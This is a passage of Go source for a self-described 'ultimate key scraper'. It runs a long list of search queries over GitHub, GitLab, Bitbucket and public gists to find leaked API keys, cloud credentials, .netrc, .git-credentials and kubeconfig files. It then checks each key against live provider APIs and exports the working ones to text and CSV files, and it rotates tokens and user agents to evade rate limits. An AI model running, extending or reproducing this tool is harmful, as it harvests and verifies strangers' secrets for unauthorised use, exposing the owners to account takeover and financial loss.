		}
		req.Header.Set("User-Agent", randUA())
		req.Header.Set("Accept", "application/json")
		for k, v := range headers {
			req.Header.Set(k, v)
		}
		resp, err := client.Do(req)
		if err != nil {
			return nil, err
		}
		body, err := io.ReadAll(io.LimitReader(resp.Body, 10*1024*1024))
		resp.Body.Close()
		if err != nil {
			return nil, err
		}
		if resp.StatusCode == 200 {
			return body, nil
		}
		if resp.StatusCode == 429 || resp.StatusCode == 503 || resp.StatusCode == 403 {
			if resp.StatusCode == 429 {
				rotateToken()
			}
			if retryAfter := resp.Header.Get("Retry-After"); retryAfter != "" {
				var seconds int64
				fmt.Sscanf(retryAfter, "%d", &seconds)
				if seconds > 0 && seconds <= 120 {
					time.Sleep(time.Duration(seconds) * time.Second)
					continue
				}
			}
			time.Sleep(backoffSleep(attempt + 1))
			continue
		}
		return nil, fmt.Errorf("HTTP %d: %s", resp.StatusCode, string(body[:min(500, len(body))]))
	}
	return nil, fmt.Errorf("max retries")
}

func initDB() error {
	var err error
	db, err = sql.Open("sqlite3", "keys_pro.db?_journal_mode=WAL&_busy_timeout=5000")
	if err != nil {
		return err
	}
	db.SetMaxOpenConns(1)
	_, err = db.Exec(`CREATE TABLE IF NOT EXISTS keys (
		key_hash TEXT PRIMARY KEY,
		key_preview TEXT,
		provider TEXT,
		category TEXT,
		source TEXT,
		found_at TEXT,
		validation_status TEXT,
		last_checked TEXT,
		metadata TEXT
	)`)
	return err
}

func seedDedupFromDB() {
	rows, err := db.Query("SELECT key_hash FROM keys")
	if err != nil {
		return
	}
	defer rows.Close()
	count := 0
	for rows.Next() {
		var hash string
		if rows.Scan(&hash) == nil {
			dedupMap.Store(hash, true)
			count++
		}
	}
	fmt.Printf("\033[36m[DEDUP]\033[0m Seeded dedup with %d previously found keys\n", count)
}

func batchInsertWorker() {
	batch := make([]insertRecord, 0, 100)
	ticker := time.NewTicker(3 * time.Second)
	defer ticker.Stop()

	flush := func() {
		if len(batch) == 0 {
			return
		}
		tx, err := db.Begin()
		if err != nil {
			return
		}
		stmt, err := tx.Prepare(`INSERT OR REPLACE INTO keys
			(key_hash, key_preview, provider, category, source, found_at, validation_status, last_checked, metadata)
			VALUES (?, ?, ?, ?, ?, ?, ?, ?, '{}')`)
		if err != nil {
			tx.Rollback()
			return
		}
		now := time.Now().UTC().Format(time.RFC3339)
		for _, r := range batch {
			keyHash := sha256Hash(r.Key)
			preview := previewKey(r.Key)
			prov, ok := providers[r.Provider]
			cat := "unknown"
			if ok {
				cat = prov.Category
			}
			stmt.Exec(keyHash, preview, r.Provider, cat, r.Source, now, r.Status, now)
		}
		stmt.Close()
		tx.Commit()
		batch = batch[:0]
	}

	for {
		select {
		case rec := <-insertCh:
			batch = append(batch, rec)
			if len(batch) >= 100 {
				flush()
			}
		case <-ticker.C:
			flush()
		}
	}
}

func storeKey(key, provider, source, status string) {
	if len(key) < 10 {
		return
	}
	select {
	case insertCh <- insertRecord{Key: key, Provider: provider, Source: source, Status: status}:
	default:
	}
}

func extractKeys(text, sourceURL string, candidateChan chan<- keyRecord) {
	for providerName, prov := range providers {
		matches := prov.Pattern.FindAllStringSubmatch(text, -1)
		for _, match := range matches {
			if len(match) < 2 {
				continue
			}
			key := strings.TrimSpace(match[1])
			if key == "" || isPlaceholder(key) || !hasContext(text, providerName) {
				continue
			}
			if rejectFalsePositive(key) {
				continue
			}
			minEntropy := 4.0
			if providerName == "mistral" || providerName == "together" {
				minEntropy = 4.5
			}
			if shannonEntropy(key) < minEntropy {
				continue
			}
			if (providerName == "mistral" || providerName == "together") && !hasMixedCase(key) {
				continue
			}
			if providerName == "openai_legacy" && (strings.HasPrefix(key, "sk-proj-") || strings.HasPrefix(key, "sk-ant-") || strings.HasPrefix(key, "sk-sf-") || strings.HasPrefix(key, "sk-or-") || strings.HasPrefix(key, "xai-")) {
				continue
			}
			if providerName == "moonshot" && len(key) == 51 && strings.HasPrefix(key, "sk-") {
				continue
			}
			keyHash := sha256Hash(key)
			if _, loaded := dedupMap.LoadOrStore(keyHash, true); loaded {
				continue
			}
			atomic.AddInt64(&candidateCount, 1)
			preview := previewKey(key)
			fmt.Printf("\033[36m[CANDIDATE]\033[0m %s: %s from %s\n", providerName, preview, sourceURL)
			candJSON, _ := json.Marshal(map[string]interface{}{
				"key_preview": preview,
				"provider":    providerName,
				"source":      sourceURL,
				"found_at":    time.Now().UTC().Format(time.RFC3339),
			})
			candidateWriter.Write(candJSON)
			select {
			case candidateChan <- keyRecord{Key: key, Provider: providerName, Source: sourceURL, FoundAt: time.Now()}:
			case <-context.Background().Done():
				return
			}
		}
	}
}

func validateKey(ctx context.Context, kr keyRecord, validChan chan<- keyRecord, invalidChan chan<- string) {
	minLen := 25
	if kr.Provider == "mistral" || kr.Provider == "together" {
		minLen = 32
	}
	if len(kr.Key) < minLen {
		atomic.AddInt64(&invalidCount, 1)
		return
	}
	if dryRun {
		select {
		case validChan <- kr:
		case <-ctx.Done():
		}
		return
	}
	prov, ok := providers[kr.Provider]
	if !ok {
		atomic.AddInt64(&invalidCount, 1)
		return
	}
	if prov.ValidateURL == "" {
		storeKey(kr.Key, kr.Provider, kr.Source, "detected")
		atomic.AddInt64(&workingCount, 1)
		fmt.Printf("\033[36m[DETECTED]\033[0m %s: %s from %s (no validation endpoint)\n", kr.Provider, previewKey(kr.Key), kr.Source)
		recJSON, _ := json.Marshal(kr)
		fileMu.Lock()
		workingFile.Write(append(recJSON, '\n'))
		fileMu.Unlock()
		select {
		case validChan <- kr:
		case <-ctx.Done():
		}
		return
	}
	if kr.Provider == "twilio" {
		twilioAuthTokenRe := regexp.MustCompile(`(?i)(?:TWILIO_AUTH_TOKEN|AUTH_TOKEN|auth_token)\s*=\s*['"]([a-f0-9]{32})['"]`)
		sourceURL := kr.Source
		rawURL := sourceURL
		if strings.Contains(sourceURL, "github.com") && strings.Contains(sourceURL, "/blob/") {
			rawURL = "https://raw.githubusercontent.com/" + strings.Replace(strings.TrimPrefix(sourceURL, "https://github.com/"), "/blob/", "/", 1)
		}
		content, err := fetchRaw(ctx, rawURL)
		if err != nil {
			fmt.Printf("\033[33m[TWILIO]\033[0m Could not fetch source for Auth Token: %s err=%v\n", previewKey(kr.Key), err)
			atomic.AddInt64(&errorCount, 1)
			return
		}
		authMatch := twilioAuthTokenRe.FindStringSubmatch(content)
		if authMatch == nil {
			broadRe := regexp.MustCompile(`(?i)auth[_-]?token\s*=\s*['"]([a-f0-9]{32})['"]`)
			authMatch = broadRe.FindStringSubmatch(content)
		}
		if authMatch == nil {
			fmt.Printf("\033[33m[TWILIO]\033[0m No Auth Token found near SID %s in %s\n", previewKey(kr.Key), sourceURL)
			atomic.AddInt64(&errorCount, 1)
			return
		}
		authToken := authMatch[1]
		validateURL := fmt.Sprintf("https://api.twilio.com/2010-04-01/Accounts/%s.json", kr.Key)
		client := newHTTPClient()
		creds := base64.StdEncoding.EncodeToString([]byte(kr.Key + ":" + authToken))
		req, err := http.NewRequestWithContext(ctx, "GET", validateURL, nil)
		if err != nil {
			atomic.AddInt64(&errorCount, 1)
			return
		}
		req.Header.Set("Authorization", "Basic "+creds)
		resp, err := client.Do(req)
		if err != nil {
			atomic.AddInt64(&errorCount, 1)
			return
		}
		io.Copy(io.Discard, resp.Body)
		resp.Body.Close()
		if resp.StatusCode == 200 {
			fmt.Printf("\033[32m[VALID]\033[0m twilio: %s (Auth Token paired) from %s\n", previewKey(kr.Key), sourceURL)
			atomic.AddInt64(&workingCount, 1)
			storeKey(kr.Key, kr.Provider, sourceURL, "valid")
			kr.Metadata = map[string]interface{}{"auth_token": authToken}
			recJSON, _ := json.Marshal(kr)
			fileMu.Lock()
			workingFile.Write(append(recJSON, '\n'))
			fileMu.Unlock()
			select {
			case validChan <- kr:
			case <-ctx.Done():
			}
			return
		} else if resp.StatusCode == 401 || resp.StatusCode == 403 {
			fmt.Printf("\033[31m[INVALID]\033[0m twilio: %s (%d) - bad SID or Auth Token\n", previewKey(kr.Key), resp.StatusCode)
			atomic.AddInt64(&invalidCount, 1)
			select {
			case invalidChan <- kr.Key:
			case <-ctx.Done():
			}
			return
		} else {
			fmt.Printf("\033[33m[TWILIO]\033[0m unexpected status %d for %s\n", resp.StatusCode, previewKey(kr.Key))
			atomic.AddInt64(&errorCount, 1)
			return
		}
	}
	client := newHTTPClient()
	for attempt := 0; attempt < 3; attempt++ {
		select {
		case <-ctx.Done():
			return
		default:
		}
		var payloadBuf *bytes.Buffer
		if prov.Payload != nil {
			payloadBuf = new(bytes.Buffer)
			json.NewEncoder(payloadBuf).Encode(prov.Payload)
		}
		validateURL := prov.ValidateURL
		if strings.Contains(validateURL, "%s") {
			validateURL = strings.Replace(validateURL, "%s", kr.Key, 1)
		}
		var req *http.Request
		var err error
		if prov.ValidateMethod == "POST" && payloadBuf != nil {
			req, err = http.NewRequestWithContext(ctx, "POST", validateURL, payloadBuf)
		} else {
			req, err = http.NewRequestWithContext(ctx, prov.ValidateMethod, validateURL, nil)
		}
		if err != nil {
			return
		}
		if prov.Headers != nil {
			for k, v := range prov.Headers(kr.Key) {
				req.Header.Set(k, v)
			}
		}
		resp, err := client.Do(req)
		if err != nil {
			return
		}
		io.Copy(io.Discard, resp.Body)
		resp.Body.Close()
		status := resp.StatusCode
		if status == 200 || status == 201 {
			fmt.Printf("\033[32m[VALID]\033[0m %s: %s (%d) from %s\n", kr.Provider, previewKey(kr.Key), status, kr.Source)
			atomic.AddInt64(&workingCount, 1)
			storeKey(kr.Key, kr.Provider, kr.Source, "valid")
			recJSON, _ := json.Marshal(kr)
			fileMu.Lock()
			workingFile.Write(append(recJSON, '\n'))
			fileMu.Unlock()
			select {
			case validChan <- kr:
			case <-ctx.Done():
			}
			return
		} else if status == 401 || status == 403 || status == 400 {
			fmt.Printf("\033[31m[INVALID]\033[0m %s: %s (%d)\n", kr.Provider, previewKey(kr.Key), status)
			atomic.AddInt64(&invalidCount, 1)
			select {
			case invalidChan <- kr.Key:
			case <-ctx.Done():
			}
			return
		} else if status == 429 || status == 503 || status == 529 {
			atomic.AddInt64(&rateHitCount, 1)
			time.Sleep(backoffSleep(attempt + 1))
			continue
		} else {
			atomic.AddInt64(&errorCount, 1)
			return
		}
	}
	atomic.AddInt64(&errorCount, 1)
}

func scrapeGitHubSearch(ctx context.Context, query string, candidateChan chan<- keyRecord) {
	headers := map[string]string{
		"Accept":               "application/vnd.github.v3.text-match+json",
		"X-GitHub-Api-Version": "2022-11-28",
	}
	if tok := currentToken(); tok != "" {
		headers["Authorization"] = "Bearer " + tok
	}
	for page := 1; page <= maxPages; page++ {
		select {
		case <-ctx.Done():
			return
		default:
		}
		apiURL := fmt.Sprintf("https://api.github.com/search/code?q=%s&per_page=100&page=%d&sort=indexed&order=desc", url.QueryEscape(query), page)
		data, err := fetchJSON(ctx, apiURL, headers)
		if err != nil {
			fmt.Printf("\033[31m[SEARCH ERROR]\033[0m query=%q page=%d err=%v\n", query[:min(40, len(query))], page, err)
			if strings.Contains(err.Error(), "422") {
				return
			}
			continue
		}
		var result struct {
			TotalCount int `json:"total_count"`
			Items      []struct {
				HTMLURL    string `json:"html_url"`
				Path       string `json:"path"`
				TextMatches []struct {
					Fragment string `json:"fragment"`
				} `json:"text_matches"`
			} `json:"items"`
		}
		if err := json.Unmarshal(data, &result); err != nil {
			return
		}
		if page == 1 {
			if result.TotalCount == 0 {
				return
			}
			fmt.Printf("\033[32m[SEARCH]\033[0m %q -> %d total results (fetching %d pages)\n", query[:min(50, len(query))], result.TotalCount, maxPages)
		}
		if len(result.Items) == 0 {
			break
		}
		for _, item := range result.Items {
			for _, tm := range item.TextMatches {
				if tm.Fragment != "" {
					extractKeys(tm.Fragment, item.HTMLURL, candidateChan)
				}
			}
			rawURL := fmt.Sprintf("https://raw.githubusercontent.com/%s", strings.Replace(strings.TrimPrefix(item.HTMLURL, "https://github.com/"), "/blob/", "/", 1))
			raw, err := fetchRaw(ctx, rawURL)
			if err != nil {
				continue
			}
			extractKeys(raw, item.HTMLURL, candidateChan)
		}
	}
}

func scrapeGistFiles(ctx context.Context, gistID string, candidateChan chan<- keyRecord) {
	apiURL := fmt.Sprintf("https://api.github.com/gists/%s", gistID)
	headers := map[string]string{
		"Accept":               "application/vnd.github+json",
		"X-GitHub-Api-Version": "2022-11-28",
	}
	if tok := currentToken(); tok != "" {
		headers["Authorization"] = "Bearer " + tok
	}
	data, err := fetchJSON(ctx, apiURL, headers)
	if err != nil {
		return
	}
	var gist struct {
		Files map[string]struct {
			RawURL  string `json:"raw_url"`
			Size    int    `json:"size"`
			Content string `json:"content"`
		} `json:"files"`
	}
	if json.Unmarshal(data, &gist) != nil {
		return
	}
	for _, f := range gist.Files {
		if f.Size > 500000 {
			continue
		}
		extractKeys(f.Content, "https://gist.github.com/"+gistID, candidateChan)
	}
}

func scrapeGitHubRepos(ctx context.Context, repoPath string, candidateChan chan<- keyRecord) {
	apiURL := fmt.Sprintf("https://api.github.com/repos/%s/git/trees/main?recursive=1", repoPath)
	headers := map[string]string{
		"Accept":               "application/vnd.github+json",
		"X-GitHub-Api-Version": "2022-11-28",
	}
	if tok := currentToken(); tok != "" {
		headers["Authorization"] = "Bearer " + tok
	}
	data, err := fetchJSON(ctx, apiURL, headers)
	if err != nil {
		return
	}
	var tree struct {
		Tree []struct {
			Path string `json:"path"`
			Type string `json:"type"`
			URL  string `json:"url"`
		} `json:"tree"`
	}
	if json.Unmarshal(data, &tree) != nil {
		return
	}
	for _, item := range tree.Tree {
		if item.Type != "blob" {
			continue
		}
		select {
		case <-ctx.Done():
			return
		default:
		}
		rawURL := fmt.Sprintf("https://raw.githubusercontent.com/%s/%s", repoPath, item.Path)
		raw, err := fetchRaw(ctx, rawURL)
		if err != nil {
			continue
		}
		extractKeys(raw, fmt.Sprintf("https://github.com/%s/blob/main/%s", repoPath, item.Path), candidateChan)
	}
}

func scrapeGitLabSearch(ctx context.Context, query string, candidateChan chan<- keyRecord) {
	if gitlabToken == "" {
		return
	}
	apiURL := fmt.Sprintf("https://gitlab.com/api/v4/search?scope=blobs&search=%s", url.QueryEscape(query))
	headers := map[string]string{
		"Accept":       "application/json",
		"PRIVATE-TOKEN": gitlabToken,
	}
	data, err := fetchJSON(ctx, apiURL, headers)
	if err != nil {
		return
	}
	var result struct {
		Count int `json:"count"`
		Blobs []struct {
			ID         string `json:"id"`
			Ref        string `json:"ref"`
			Filename   string `json:"filename"`
			Path       string `json:"path"`
			Base64     string `json:"data"`
			ProjectID  int    `json:"project_id"`
			Repository struct {
				FullName string `json:"full_name"`
			} `json:"repository"`
		} `json:"blobs"`
	}
	if err := json.Unmarshal(data, &result); err != nil || result.Count == 0 {
		return
	}
	fmt.Printf("\033[32m[GL SEARCH]\033[0m %q -> %d results\n", query[:min(50, len(query))], result.Count)
	for _, blob := range result.Blobs {
		rawContent, err := decodeBase64Content(blob.Base64)
		if err != nil || rawContent == "" {
			continue
		}
		sourceURL := fmt.Sprintf("https://gitlab.com/%s/-/blob/%s/%s", blob.Repository.FullName, blob.Ref, blob.Path)
		extractKeys(rawContent, sourceURL, candidateChan)
	}
}

func scrapeBitbucketSearch(ctx context.Context, query string, candidateChan chan<- keyRecord) {
	if bitbucketUser == "" || bitbucketAppPwd == "" {
		return
	}
	apiURL := fmt.Sprintf("https://api.bitbucket.org/2.0/repositories/%s/search/code?q=%s", url.QueryEscape("*"), url.QueryEscape(query))
	headers := map[string]string{"Accept": "application/json"}
	auth := base64.StdEncoding.EncodeToString([]byte(bitbucketUser + ":" + bitbucketAppPwd))
	headers["Authorization"] = "Basic " + auth
	data, err := fetchJSON(ctx, apiURL, headers)
	if err != nil {
		return
	}
	var result struct {
		Values []struct {
			Links struct {
				Self struct {
					Href string `json:"href"`
				} `json:"self"`
			} `json:"links"`
			Path string `json:"path"`
		} `json:"values"`
	}
	if json.Unmarshal(data, &result) != nil {
		return
	}
	for _, item := range result.Values {
		rawURL := item.Links.Self.Href
		raw, err := fetchRaw(ctx, rawURL)
		if err != nil {
			continue
		}
		extractKeys(raw, fmt.Sprintf("https://bitbucket.org/%s", item.Path), candidateChan)
	}
}

func decodeBase64Content(b64 string) (string, error) {
	decoded, err := base64.StdEncoding.DecodeString(b64)
	if err != nil {
		decoded, err = base64.RawStdEncoding.DecodeString(b64)
		if err != nil {
			return "", err
		}
	}
	return string(decoded), nil
}

func scrapePublicGists(ctx context.Context, candidateChan chan<- keyRecord) {
	since := time.Now().Add(-24 * time.Hour).Format(time.RFC3339)
	apiURL := "https://api.github.com/gists/public?since=" + since + "&per_page=100"
	headers := map[string]string{
		"Accept":               "application/vnd.github+json",
		"X-GitHub-Api-Version": "2022-11-28",
	}
	if tok := currentToken(); tok != "" {
		headers["Authorization"] = "Bearer " + tok
	}
	data, err := fetchJSON(ctx, apiURL, headers)
	if err != nil {
		return
	}
	var gists []struct {
		ID    string `json:"id"`
		Files map[string]struct {
			Content string `json:"content"`
			Size    int    `json:"size"`
		} `json:"files"`
	}
	if json.Unmarshal(data, &gists) != nil {
		return
	}
	for _, g := range gists {
		for _, f := range g.Files {
			if f.Size > 500000 {
				continue
			}
			extractKeys(f.Content, "https://gist.github.com/"+g.ID, candidateChan)
		}
	}
}

func exportResults() {
	workingKeys := make(map[string]struct {
		Key      string
		Provider string
		Source   string
		FoundAt  string
	})

	if data, err := os.ReadFile("working_pro.jsonl"); err == nil {
		scanner := bufio.NewScanner(bytes.NewReader(data))
		for scanner.Scan() {
			var kr keyRecord
			if json.Unmarshal(scanner.Bytes(), &kr) == nil && len(kr.Key) > 0 {
				keyHash := sha256Hash(kr.Key)
				workingKeys[keyHash] = struct {
					Key      string
					Provider string
					Source   string
					FoundAt  string
				}{kr.Key, kr.Provider, kr.Source, kr.FoundAt.Format(time.RFC3339)}
			}
		}
	}

	txtFile, err := os.Create("working_keys_pro.txt")
	if err != nil {
		return
	}
	defer txtFile.Close()

	csvFile, err := os.Create("working_keys_pro.csv")
	if err != nil {
		return
	}
	defer csvFile.Close()
	csvWriter := csv.NewWriter(csvFile)
	defer csvWriter.Flush()
	csvWriter.Write([]string{"key", "provider", "source", "found_at"})

	providerCounts := make(map[string]int)
	for _, rec := range workingKeys {
		fmt.Fprintln(txtFile, rec.Key)
		csvWriter.Write([]string{rec.Key, rec.Provider, rec.Source, rec.FoundAt})
		providerCounts[rec.Provider]++
	}

	summary := map[string]interface{}{
		"total_valid_keys":   len(workingKeys),
		"exported_at":        time.Now().UTC().Format(time.RFC3339),
		"keys_per_provider":  providerCounts,
		"runtime_seconds":    time.Since(startTime).Seconds(),
		"total_scanned":      atomic.LoadInt64(&scannedCount),
		"total_candidates":   atomic.LoadInt64(&candidateCount),
		"total_invalid":      atomic.LoadInt64(&invalidCount),
		"total_rate_limited": atomic.LoadInt64(&rateHitCount),
		"total_errors":       atomic.LoadInt64(&errorCount),
	}
	summaryJSON, _ := json.MarshalIndent(summary, "", "  ")
	os.WriteFile("summary_pro.json", summaryJSON, 0644)
	fmt.Printf("\033[32m[EXPORT]\033[0m Exported %d valid keys\n", len(workingKeys))
}

func main() {
	for _, arg := range os.Args[1:] {
		if arg == "--help" || arg == "-h" {
			fmt.Println("Usage: scraper_pro-main [OPTIONS]")
			fmt.Println("Ultimate key scraper — 30+ providers, multi-token rotation")
			fmt.Println("\nEnv vars: GITHUB_TOKENS, GITHUB_TOKEN, GITLAB_TOKEN, BITBUCKET_USER, BITBUCKET_APP_PASSWORD, DRY_RUN")
			os.Exit(0)
		}
	}

	log.SetFlags(0)
	log.SetOutput(os.Stdout)

	initTokenRotation()
	initLogging()
	defer func() {
		if logFile != nil {
			logFile.Close()
		}
	}()

	printBanner()

	if len(githubTokens) == 0 {
		fmt.Println("\033[33m[WARNING]\033[0m No GITHUB_TOKEN/GITHUB_TOKENS set. GitHub will use guest rate (60 req/hour)")
	} else {
		fmt.Printf("\033[32m[GITHUB]\033[0m %d token(s) loaded: %s...\n", len(githubTokens), githubTokens[0][:min(10, len(githubTokens[0]))])
		fmt.Println("\033[36m[DIAG]\033[0m Testing GitHub API...")
		testURL := "https://api.github.com/search/code?q=filename:.env&per_page=1"
		testHeaders := map[string]string{
			"Accept":               "application/vnd.github+json",
			"X-GitHub-Api-Version": "2022-11-28",
		}
		if tok := currentToken(); tok != "" {
			testHeaders["Authorization"] = "Bearer " + tok
		}
		testData, testErr := fetchJSON(context.Background(), testURL, testHeaders)
		if testErr != nil {
			fmt.Printf("\033[31m[DIAG FAIL]\033[0m %v\n", testErr)
		} else {
			var tr struct{ TotalCount int `json:"total_count"` }
			json.Unmarshal(testData, &tr)
			fmt.Printf("\033[32m[DIAG OK]\033[0m Found %d results\n", tr.TotalCount)
		}
	}

	if dryRun {
		fmt.Println("\033[36m[DRY_RUN]\033[0m DRY RUN ENABLED - No validation will be performed")
	}

	if err := initDB(); err != nil {
		log.Fatal("Failed to initialize database:", err)
	}
	seedDedupFromDB()

	if gitlabToken == "" {
		fmt.Println("\033[33m[WARNING]\033[0m No GITLAB_TOKEN set. GitLab search disabled.")
	} else {
		fmt.Printf("\033[32m[GITLAB]\033[0m Token loaded: %s...\n", gitlabToken[:min(10, len(gitlabToken))])
	}

	if bitbucketUser == "" || bitbucketAppPwd == "" {
		fmt.Println("\033[33m[WARNING]\033[0m No BITBUCKET_USER/BITBUCKET_APP_PASSWORD set. Bitbucket disabled.")
	} else {
		fmt.Printf("\033[32m[BITBUCKET]\033[0m Credentials loaded for: %s\n", bitbucketUser)
	}

	var err error

	workingFile, err = os.OpenFile("working_pro.jsonl", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		log.Fatal("Failed to open working_pro.jsonl:", err)
	}

	candidateWriter, err = newAsyncFileWriter("candidates_pro.jsonl")
	if err != nil {
		log.Fatal("Failed to create candidate writer:", err)
	}
	invalidWriter, err = newAsyncFileWriter("invalid_pro.jsonl")
	if err != nil {
		log.Fatal("Failed to create invalid writer:", err)
	}

	go batchInsertWorker()

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	candidateChan := make(chan keyRecord, 5000)
	validChan := make(chan keyRecord, 1000)
	invalidChan := make(chan string, 5000)

	var valWg sync.WaitGroup
	for i := 0; i < 50; i++ {
		valWg.Add(1)
		go func() {
			defer valWg.Done()
			for kr := range validChan {
				_ = kr
			}
		}()
	}

	go func() {
		for key := range invalidChan {
			if len(key) >= 10 {
				invalidWriter.Write([]byte(key))
			}
		}
	}()

	queries := []string{
		"filename:.env AWS_ACCESS_KEY_ID=AKIA",
		"filename:.env AWS_SECRET_ACCESS_KEY=",
		"filename:.env STRIPE_SECRET_KEY=sk_live_",
		"filename:.env SLACK_BOT_TOKEN=xoxb-",
		"filename:.env GITHUB_TOKEN=ghp_",
		"filename:.env NPM_TOKEN=npm_",
		"filename:.env SENDGRID_API_KEY=SG.",
		"filename:.env TELEGRAM_BOT_TOKEN=",
		"filename:.env DISCORD_TOKEN=",
		"filename:.env DATABASE_URL=postgresql://",
		"filename:.env DATABASE_URL=mysql://",
		"filename:.env REDIS_URL=redis://",
		"filename:.env MONGODB_URI=mongodb+srv://",
		"ghp_[a-zA-Z0-9]{36}",
		"is:fork filename:.env OPENAI_API_KEY=",
		"is:fork filename:.env ANTHROPIC_API_KEY=",
		"is:fork gsk_",
		"is:fork sk-proj-",
		"is:fork AIzaSy",
		"is:archived filename:.env API_KEY",
		"filename:.env pushed:>2026-06-01 OPENAI_API_KEY=",
		"filename:.env pushed:>2026-06-01 ANTHROPIC_API_KEY=",
		"filename:.env pushed:>2026-06-01 GROQ_API_KEY=",
		"filename:credentials.json api_key",
		"filename:service-account.json private_key",
		"filename:.env.bak API_KEY",
		"filename:.env.old API_KEY",
		"filename:secrets.yml api_key",
		"filename:.npmrc _authToken",
		"sk-proj- language:rust",
		"sk-proj- language:java",
		"sk-proj- language:csharp",
		"sk-proj- language:php",
		"sk-proj- language:ruby",
		"sk-ant-api03- language:python",
		"sk-ant-api03- language:javascript",
		"gsk_ language:python",
		"gsk_ language:javascript",
		"xai- language:python",
		"xai- language:javascript",
		"filename:.env OPENAI_API_KEY=",
		"filename:.env ANTHROPIC_API_KEY=",
		"filename:.env MISTRAL_API_KEY=",
		"filename:.env GROQ_API_KEY=",
		"filename:.env DEEPSEEK_API_KEY=",
		"filename:.env COHERE_API_KEY=",
		"filename:.env PERPLEXITY_API_KEY=",
		"filename:.env REPLICATE_API_TOKEN=",
		"filename:.env TOGETHER_API_KEY=",
		"filename:.env FIREWORKS_API_KEY=",
		"filename:.env OPENROUTER_API_KEY=",
		"filename:.env GOOGLE_API_KEY=",
		"filename:.env HUGGING_FACE_API_KEY=",
		"filename:.env XAI_API_KEY=",
		"filename:.env MOONSHOT_API_KEY=",
		"sk-proj- language:python",
		"sk-proj- language:javascript",
		"sk-proj- language:go",
		"sk-proj- language:typescript",
		"sk-ant-api03-",
		"AIzaSy",
		"gsk_",
		"pplx-",
		"r8_",
		"fw_",
		"sk-or-v1",
		"sk-sf-",
		"co-",
		"jina_",
		"xai-",
		"OPENAI_API_KEY=sk-",
		"ANTHROPIC_API_KEY=sk-ant-",
		"GROQ_API_KEY=gsk_",
		"DEEPSEEK_API_KEY=deepseek-",
		"XAI_API_KEY=xai-",
		"filename:.env.local",
		"filename:.env.production",
		"filename:.env.development",
		"filename:.env.staging",
		"filename:.env.example",
		"\"apiKey\" \"sk-proj-\"",
		"filename:.env GEMINI_API_KEY=",
		"filename:.env SILICONFLOW_API_KEY=",
		"filename:.env JINA_API_KEY=",
		"filename:.env CLOUDFLARE_API_TOKEN=",
		"filename:.env TWILIO_ACCOUNT_SID=AC",
		"filename:.env TWILIO_AUTH_TOKEN=",
		"filename:.env TWILIO_API_KEY=SK",
		"filename:.env TWILIO_API_SECRET=",
		"TWILIO_ACCOUNT_SID=AC",
		"TWILIO_AUTH_TOKEN=",
		"TWILIO_API_KEY=SK",
		"TWILIO_API_SECRET=",
		"filename:.env TWILIO_ACCOUNT_SID=AC",
		"filename:docker-compose.yml API_KEY",
		"filename:.env.local OPENAI",
		"filename:config.json api_key",
		"filename:config.yml api_key",
		"filename:settings.py SECRET_KEY",
		"extension:env OPENAI_API_KEY",
		"extension:env ANTHROPIC_API_KEY",
		"extension:env GROQ_API_KEY",
		"extension:env XAI_API_KEY",
		"path:.env OPENAI",
		"path:.env ANTHROPIC",
		"API_KEY=sk-",
		"secret_key=sk-",
		"openai_api_key=",
		"anthropic_api_key=",
		"groq_api_key=",
		"xai_api_key=",
		"moonshot_api_key=",
		"deepseek_api_key=",
		"cohere_api_key=",
		"replicate_api_token=",
		"perplexity_api_key=",
		"together_api_key=",
		"fireworks_api_key=",
		"openrouter_api_key=",
		"cloudflare_api_token=",
		"gemini_api_key=",
		"filename:appsettings.json ApiKey",
		"filename:application.properties openai",
		"filename:application.yml openai",
		"filename:config.php OPENAI_API_KEY",
		"export OPENAI_API_KEY=sk-",
		"export ANTHROPIC_API_KEY=sk-ant-",
		"export GROQ_API_KEY=gsk_",
		"filename:setup.sh OPENAI_API_KEY",
		"filename:deploy.sh API_KEY=sk-",
		"filename:README.md OPENAI_API_KEY=sk-",
		"filename:README.md gsk_",
		"filename:terraform.tfvars openai",
		"filename:serverless.yml OPENAI_API_KEY",
		"filename:app.yaml OPENAI_API_KEY",
		"filename:.git-credentials",
		"filename:.pgpass",
		"filename:.netrc",
		"filename:kubeconfig",
		"filename:.dockerconfigjson",
		"filename:Jupyter OPENAI_API_KEY",
		"path:.github/workflows OPENAI_API_KEY",
		"path:.github/workflows ANTHROPIC_API_KEY",
		"filename:.travis.yml OPENAI_API_KEY",
		"filename:Jenkinsfile OPENAI_API_KEY",
	}

	gistQueries := []string{"sk-ant-api03", "sk-proj-", "OPENAI_API_KEY", "gsk_", "pplx-", "xai-", "ghp_", "AKIA", "sk_live_", "xoxb-", "npm_", "SG.", "TWILIO_ACCOUNT_SID", "TWILIO_AUTH_TOKEN", "TWILIO_API_KEY", "TWILIO_ACCOUNT_SID=AC"}
	repoTargets := []string{"openai/openai-cookbook", "anthropics/courses", "mistralai/cookbook", "ollama/ollama", "lm-sys/FastChat", "huggingface/transformers"}

	gitlabQueries := []string{
		"filename:.env", "filename:.env.local", "filename:.env.production",
		"sk-ant-api03", "sk-proj-", "AIzaSy", "gsk_", "pplx-", "r8_", "fw_", "xai-",
		"OPENAI_API_KEY=", "ANTHROPIC_API_KEY=", "GROQ_API_KEY=", "XAI_API_KEY=",
		"TWILIO_ACCOUNT_SID=", "TWILIO_AUTH_TOKEN=", "TWILIO_API_KEY=", "TWILIO_API_SECRET=",
	}

	bitbucketQueries := []string{
		"filename:.env", "filename:.env.local",
		"sk-ant-api03", "sk-proj-", "AIzaSy", "gsk_", "pplx-",
		"OPENAI_API_KEY=", "GROQ_API_KEY=", "XAI_API_KEY=",
	}

	queryChan := make(chan scrapeJob, 5000)

	var sourceWg sync.WaitGroup

	for i := 0; i < queryWorkersN; i++ {
		sourceWg.Add(1)
		go func() {
			defer sourceWg.Done()
			for job := range queryChan {
				jitter := time.Duration(100+rand.IntN(500)) * time.Millisecond
				time.Sleep(jitter)
				switch job.source {
				case "github":
					scrapeGitHubSearch(ctx, job.query, candidateChan)
				case "gitlab":
					scrapeGitLabSearch(ctx, job.query, candidateChan)
				case "bitbucket":
					scrapeBitbucketSearch(ctx, job.query, candidateChan)
				}
			}
		}()
	}

	for _, q := range queries {
		select {
		case queryChan <- scrapeJob{source: "github", query: q}:
		case <-ctx.Done():
			break
		}
	}
	for _, q := range gitlabQueries {
		select {
		case queryChan <- scrapeJob{source: "gitlab", query: q}:
		case <-ctx.Done():
			break
		}
	}
	for _, q := range bitbucketQueries {
		select {
